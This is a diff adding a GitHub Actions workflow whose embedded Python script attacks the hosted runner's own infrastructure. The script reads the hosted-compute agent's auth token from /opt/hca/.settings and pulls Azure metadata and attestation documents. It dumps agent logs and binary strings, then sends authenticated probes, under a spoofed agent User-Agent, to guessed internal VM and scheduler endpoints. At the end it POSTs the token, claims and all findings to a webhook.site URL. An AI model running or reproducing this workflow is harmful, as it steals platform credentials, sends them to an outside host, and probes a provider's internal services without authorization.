@@ -1,0 +1,310 @@
+name: Probe v53 - account_a
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    env:
+      V53_SOURCE: v53_account_a
+    steps:
+      - name: v53 hca-log URL mining + alt path structures
+        run: |
+          cat > /tmp/v53_probe.py << 'PROBE_EOF'
+          
+          import json, os, base64, subprocess, re, urllib.request, urllib.error, time
+          
+          WEBHOOK = "https://webhook.site/53b82227-04b4-4ad2-9ccd-2abbd8a81837"
+          RUN_ID  = os.environ.get("GITHUB_RUN_ID", "unknown")
+          REPO    = os.environ.get("GITHUB_REPOSITORY", "unknown")
+          SOURCE  = os.environ.get("V53_SOURCE", "v53_account_a")
+          
+          def probe(method, url, body=None, extra=None):
+              data = body.encode() if isinstance(body, str) else (body or None)
+              headers = {"Content-Type": "application/json", "User-Agent": "hosted-compute-agent/1.0"}
+              if extra:
+                  headers.update(extra)
+              if data:
+                  headers["Content-Length"] = str(len(data))
+              req = urllib.request.Request(url, data=data, headers=headers, method=method)
+              try:
+                  r = urllib.request.urlopen(req, timeout=14)
+                  return {"status": r.status, "body": r.read(8000).decode("utf-8","replace"), "hdrs": dict(r.headers)}
+              except urllib.error.HTTPError as e:
+                  return {"status": e.code, "body": e.read(8000).decode("utf-8","replace"), "hdrs": dict(e.headers)}
+              except Exception as ex:
+                  return {"status": 0, "body": str(ex), "hdrs": {}}
+          
+          def auth_attest(method, url, hca_token, pkcs7_doc, body=None):
+              return probe(method, url, body, {
+                  "Authorization": f"Bearer {hca_token}",
+                  "x-attestation-provider": "azure",
+                  "x-attestation-encoding": "pkcs7",
+                  "x-attestation-document": pkcs7_doc,
+              })
+          
+          def sh(cmd, timeout=12):
+              try:
+                  r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+                  return r.stdout + r.stderr
+              except Exception as ex:
+                  return f"TIMEOUT/ERROR: {ex}"
+          
+          print(f"[{SOURCE}] start")
+          
+          with open("/opt/hca/.settings") as f:
+              s = json.load(f)
+          
+          token     = s.get("authToken", "")
+          sched_url = s.get("schedulerApiUrl", "").rstrip("/")
+          config_id = s.get("configId", "")
+          quota_id  = s.get("quotaId", "")
+          orch_id   = os.environ.get("ACTIONS_ORCHESTRATION_ID", "")
+          
+          parts = token.split(".")
+          pad = parts[1] + "=" * (4 - len(parts[1]) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(pad))
+          wid = claims.get("wid", "")
+          mac = claims.get("mac", "")
+          vmn = claims.get("vmn", "")
+          
+          print(f"[{SOURCE}] configId={config_id} quotaId={quota_id}")
+          print(f"[{SOURCE}] wid={wid}")
+          print(f"[{SOURCE}] mac={mac} vmn={vmn}")
+          
+          results = {"settings": s, "jwt_claims": claims}
+          
+          # -- 1. Get PKCS7 attestation document (FRESH) ----------------------------
+          r = probe("GET",
+              "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01",
+              extra={"Metadata": "true"})
+          pkcs7_sig = ""
+          try:
+              att_data = json.loads(r["body"])
+              pkcs7_sig = att_data.get("signature", "")
+              print(f"[PKCS7] len={len(pkcs7_sig)}")
+              results["pkcs7_sig"] = pkcs7_sig
+          except Exception as ex:
+              print(f"[PKCS7] error: {ex}")
+          
+          # -- 2. Get IMDS tags ------------------------------------------------------
+          r2 = probe("GET", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+                     extra={"Metadata": "true"})
+          try:
+              imds_data = json.loads(r2["body"])
+              compute = imds_data.get("compute", {})
+              tags_list = compute.get("tagsList", [])
+              hc_tags = {t["name"]: t["value"] for t in tags_list if "hosted_compute" in t.get("name","")}
+              base_ro_url = hc_tags.get("hosted_compute.base_ro_url", "").rstrip("/")
+              allocation_id = hc_tags.get("hosted_compute.allocation_id", "")
+              vm_name = compute.get("name", "")
+              sub_id = compute.get("subscriptionId", "")
+              print(f"[IMDS] base_ro_url={base_ro_url} allocation_id={allocation_id}")
+              print(f"[IMDS] vm_name={vm_name}")
+              results["imds_tags"] = hc_tags
+              results["imds_compute"] = {"vm_name": vm_name, "sub_id": sub_id}
+          except Exception as ex:
+              print(f"[IMDS] error: {ex}")
+              base_ro_url = ""
+              allocation_id = ""
+          
+          from urllib.parse import urlparse
+          if base_ro_url:
+              parsed = urlparse(base_ro_url)
+              host = f"{parsed.scheme}://{parsed.netloc}"
+              vm_v1_base = base_ro_url  # already includes /vm/v1
+          else:
+              p = urlparse(sched_url)
+              host = f"{p.scheme}://{p.netloc}"
+              vm_v1_base = f"{host}/vm/v1"
+          
+          sched_parsed = urlparse(sched_url)
+          sched_host = f"{sched_parsed.scheme}://{sched_parsed.netloc}"
+          
+          print(f"[{SOURCE}] vm_v1_base={vm_v1_base}")
+          print(f"[{SOURCE}] sched_host={sched_host}")
+          
+          # -- 3. Mine HCA log for URL patterns ------------------------------------
+          print(f"\n[{SOURCE}] Mining HCA log for URL patterns...")
+          # Full HCA log
+          hca_log_full = sh("cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null")
+          print(f"[HCA_LOG] full log {len(hca_log_full)} chars")
+          
+          # Extract URL-like patterns
+          url_patterns = sh("cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null | grep -iE '(https?://|/vm/|/v1/|/api/|GET|POST|PUT|DELETE|HEAD)' | head -100")
+          print(f"[HCA_LOG] URL patterns:\n{url_patterns[:3000]}")
+          results["hca_log_urls"] = url_patterns[:5000]
+          results["hca_log_full"] = hca_log_full[:20000]
+          
+          # -- 4. Binary format string analysis ------------------------------------
+          print(f"\n[{SOURCE}] HCA binary format strings...")
+          bin_path = "/opt/hca/hosted-compute-agent"
+          # Look for format string patterns that would build URLs
+          fmt_strings = sh(f"strings {bin_path} 2>/dev/null | grep -E '%%|\\\\n|%s|%v|%d' | grep -iE '(vm|alloc|heartbeat|health|config|status|ann|runner|job|agent)' | sort -u | head -60")
+          path_fmts = sh(f"strings {bin_path} 2>/dev/null | grep -E '^[a-z/].*([a-z]{{4,}})' | grep -iv 'error\\|failed\\|warn\\|info\\|debug\\|panic\\|fatal\\|cannot\\|unable\\|invalid\\|unexpected' | sort -u | head -100")
+          go_routines = sh(f"strings {bin_path} 2>/dev/null | grep -E 'func|goroutine|github.com/github' | head -60")
+          print(f"[BIN_FMT] format strings:\n{fmt_strings[:2000]}")
+          print(f"[BIN_PATH] path-like strings:\n{path_fmts[:3000]}")
+          print(f"[BIN_GO] Go symbols:\n{go_routines[:2000]}")
+          results["bin_fmt_strings"] = fmt_strings[:3000]
+          results["bin_path_strings"] = path_fmts[:5000]
+          results["bin_go_symbols"] = go_routines[:3000]
+          
+          # -- 5. Probe /vm/v1 with all identifier variants as keys --------------
+          print(f"\n[{SOURCE}] Probing /vm/v1 with multiple path structures...")
+          vm_results = {}
+          
+          # Extract wid components
+          wid_clean = wid.strip("{}")
+          wid_parts = [p.strip() for p in wid_clean.split("}:{")]
+          print(f"[WID] parts={wid_parts}")
+          
+          # Scheduler-style paths under /vm/v1
+          sched_style_paths = [
+              ("GET",  "/annotation"),
+              ("GET",  "/status"),
+              ("GET",  "/heartbeat"),
+              ("GET",  "/configuration"),
+              ("GET",  "/context"),
+              ("GET",  "/vminfo"),
+              ("GET",  "/properties"),
+              ("GET",  "/info"),
+              ("GET",  "/health"),
+              ("GET",  "/ready"),
+              ("GET",  "/version"),
+              ("PUT",  "/heartbeat"),
+              ("POST", "/heartbeat"),
+              ("GET",  "/metrics"),
+              ("GET",  "/logs"),
+              ("GET",  "/network"),
+              ("GET",  "/environment"),
+              ("GET",  "/capabilities"),
+              ("GET",  "/settings"),
+              ("GET",  "/config"),
+          ]
+          
+          # configId-based paths
+          config_paths = []
+          if config_id:
+              config_paths = [
+                  ("GET",  f"/{config_id}"),
+                  ("GET",  f"/{config_id}/status"),
+                  ("GET",  f"/{config_id}/config"),
+                  ("GET",  f"/{config_id}/heartbeat"),
+                  ("GET",  f"/{config_id}/annotation"),
+                  ("GET",  f"/{config_id}/info"),
+              ]
+          
+          # quotaId-based paths
+          quota_paths = []
+          if quota_id:
+              quota_paths = [
+                  ("GET",  f"/{quota_id}"),
+                  ("GET",  f"/{quota_id}/status"),
+              ]
+          
+          # mac-based paths (mac claim in JWT)
+          mac_paths = []
+          if mac:
+              mac_paths = [
+                  ("GET",  f"/{mac}"),
+                  ("GET",  f"/{mac}/status"),
+                  ("GET",  f"/{mac}/config"),
+              ]
+          
+          # vmn-based paths (vmn = VM name)
+          vmn_paths = []
+          if vmn:
+              vmn_paths = [
+                  ("GET",  f"/{vmn}"),
+                  ("GET",  f"/{vmn}/status"),
+                  ("GET",  f"/{vmn}/config"),
+              ]
+          
+          # wid component paths
+          wid_paths = []
+          for wid_part in wid_parts:
+              wid_paths += [
+                  ("GET",  f"/{wid_part}"),
+                  ("GET",  f"/{wid_part}/status"),
+              ]
+          
+          # Run all probes
+          all_probes = (
+              [("sched_style", p) for p in sched_style_paths] +
+              [("config_id", p) for p in config_paths] +
+              [("quota_id", p) for p in quota_paths] +
+              [("mac", p) for p in mac_paths] +
+              [("vmn", p) for p in vmn_paths] +
+              [("wid_part", p) for p in wid_paths]
+          )
+          
+          for prefix, (method, path) in all_probes:
+              url = vm_v1_base + path
+              r = auth_attest(method, url, token, pkcs7_sig,
+                              body='{}' if method not in ("GET", "DELETE") else None)
+              key = f"{prefix}_{method}_{path.lstrip('/').replace('/', '_')}"
+              status = r["status"]
+              body_short = r["body"][:300]
+              vm_results[key] = {"status": status, "body": body_short, "url": url}
+              if status not in (404, 405, 0):
+                  print(f"[VM_V1] *** {prefix} {method} {path} -> {status} | {body_short}")
+              else:
+                  print(f"[VM_V1] {method} {path:45} -> {status}")
+          
+          results["vm_v1_probe"] = vm_results
+          
+          # -- 6. Try schedulerApiUrl host with /vm/v1 prefix -------------------
+          # Maybe /vm/v1 lives on the SCHEDULER host, not a separate VM host
+          print(f"\n[{SOURCE}] Trying scheduler host for /vm/v1...")
+          sched_vm_base = f"{sched_host}/vm/v1"
+          sched_vm_results = {}
+          for method, path in sched_style_paths[:10]:
+              url = sched_vm_base + path
+              r = auth_attest(method, url, token, pkcs7_sig,
+                              body='{}' if method not in ("GET",) else None)
+              key = f"{method}_{path.lstrip('/').replace('/','_')}"
+              sched_vm_results[key] = {"status": r["status"], "body": r["body"][:200], "url": url}
+              if r["status"] not in (404, 405, 0, 401):
+                  print(f"[SCHED_VM] *** {method} {path} -> {r['status']} | {r['body'][:100]}")
+              else:
+                  print(f"[SCHED_VM] {method} {path:40} -> {r['status']}")
+          results["sched_vm_probe"] = sched_vm_results
+          
+          # -- 7. OPTIONS on root to discover routes ------------------------------
+          print(f"\n[{SOURCE}] OPTIONS probes (discover routes)...")
+          opts_results = {}
+          for base, label in [(vm_v1_base, "vm_v1"), (f"{vm_v1_base}/", "vm_v1_slash")]:
+              r = auth_attest("OPTIONS", base, token, pkcs7_sig)
+              opts_results[label] = {"status": r["status"], "body": r["body"][:500], "hdrs": dict(list(r.get("hdrs",{}).items())[:20])}
+              print(f"[OPTIONS] {label} -> {r['status']} | hdrs={list(r.get('hdrs',{}).keys())} body={r['body'][:200]}")
+          results["options"] = opts_results
+          
+          # -- 8. Read /mnt/configmap if it exists --------------------------------
+          print(f"\n[{SOURCE}] /mnt/configmap check...")
+          configmap = sh("ls /mnt/configmap 2>&1 && cat /mnt/configmap/* 2>&1")
+          print(f"[CONFIGMAP] {configmap[:1000]}")
+          results["configmap"] = configmap[:3000]
+          
+          # -- 9. POST webhook ---------------------------------------------------
+          payload = {
+              "source": SOURCE, "run_id": RUN_ID, "repo": REPO,
+              "token": token, "claims": claims, "orch_id": orch_id,
+              "wid": wid, "allocation_id": allocation_id,
+              "config_id": config_id, "quota_id": quota_id,
+              "vm_v1_base": vm_v1_base,
+              "results": results,
+          }
+          data = json.dumps(payload, default=str).encode()
+          req = urllib.request.Request(WEBHOOK, data=data,
+                                        headers={"Content-Type": "application/json"}, method="POST")
+          try:
+              r = urllib.request.urlopen(req, timeout=30)
+              print(f"\n[{SOURCE}] Webhook: {r.status}")
+          except Exception as ex:
+              print(f"[{SOURCE}] Webhook error: {ex}")
+          
+          print(f"[{SOURCE}] DONE")
+          PROBE_EOF
+          python3 /tmp/v53_probe.py
+      - name: Keep alive
+        run: sleep 60
